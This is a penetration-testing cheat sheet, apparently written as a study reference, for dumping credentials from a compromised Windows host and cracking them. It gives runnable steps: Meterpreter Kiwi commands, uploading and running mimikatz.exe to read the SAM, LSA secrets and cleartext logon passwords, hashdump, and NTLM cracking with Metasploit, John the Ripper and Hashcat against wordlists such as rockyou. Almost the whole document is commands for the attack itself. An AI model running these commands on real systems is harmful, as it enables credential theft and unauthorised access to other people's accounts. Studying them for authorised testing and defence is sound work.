# Dumping Hashes With Mimikatz - Kiwi

The Meterpreter Kiwi plugin is a Metasploit Framework extension based on Mimikatz, designed for extracting sensitive credentials from compromised Windows systems.

**Kiwi Extension for Credential Dumping**

```shell
# Load the Kiwi Extension for Credential Dumping.
load kiwi # Load the Kiwi extension.
help kiwi  # Shows the help menu for available Kiwi commands.

creds_all # Dump all stored credentials, including plaintext passwords, hashes, and Kerberos tickets.
lsa_dump_sam # The SAM file contains hashed credentials for local user accounts.
lsa_dump_secrets # Find the syskey by dumping the LSA secrets.
```

**Manual Credential Extraction Using Mimikatz Executable**

```shell
# Upload the Mimikatz executable from your local machine.
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

shell # Start a command shell from the Meterpreter session.
.\mimikatz.exe # Execute Mimikatz from the shell.

# Verify Privileges in Mimikatz
privilege::debug  # Should return 'Privilege '20' OK' if successful.
lsadump::sam  # Dumps hashed credentials from the SAM file.
lsadump::secrets  # Extracts system secrets.

# Extract Cleartext Passwords from Memory
sekurlsa::logonpasswords # If the system is configured to store passwords in memory, Mimikatz can extract them.
# If no cleartext passwords appear, the system is likely well-configured and secured.
```

> **NOTE:** When users log on to a Windows system, credentials might be stored in memory. Misconfigured systems can store these passwords in cleartext, allowing tools like Mimikatz to retrieve them. Well-configured systems clear passwords from memory, meaning no results will appear from this command.

<br>

# Windows Credential Dumping and Cracking

**Dump NTLM hashes**

```shell
# List of user accounts and their hashes  
hashdump

# Verify that the hashes are stored in the MSF database or not.
background
creds
```

**Crack NTLM hashes using Metasploit**

```shell
# Use an auxiliary NTLM hash cracking module to crack stored NTLM hashes.
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST <passwords_wordlist>
exploit
creds
```

**Crack NTLM hashes using John The Ripper**

```shell
john
john --list=formats
john --list=formats | grep NTLM
john --list=formats | grep NT

# If we don't specify the word list, then John The Ripper will use its default word list.
john --format=NT hashes.txt

# For specific wordlist
john --format=NT hashes.txt --wordlist=<wordlist_location> # Save the credentials

# Example:
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

From a penetration tester’s perspective, this information is extremely valuable because it means we can now legitimately authenticate to the target system — either through **RDP** or another protocol such as **SSH**.

**Crack NTLM hashes using Hashcat**

```shell
hashcat --help
hashcat -a 0 -m 1000 hashes.txt /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# Cracks NTLM hashes (-m 1000) using a wordlist attack (-a 0) against hashes stored in hashes.txt.
# Commonly used for Windows password hashes dumped from SAM/NTDS files.
```
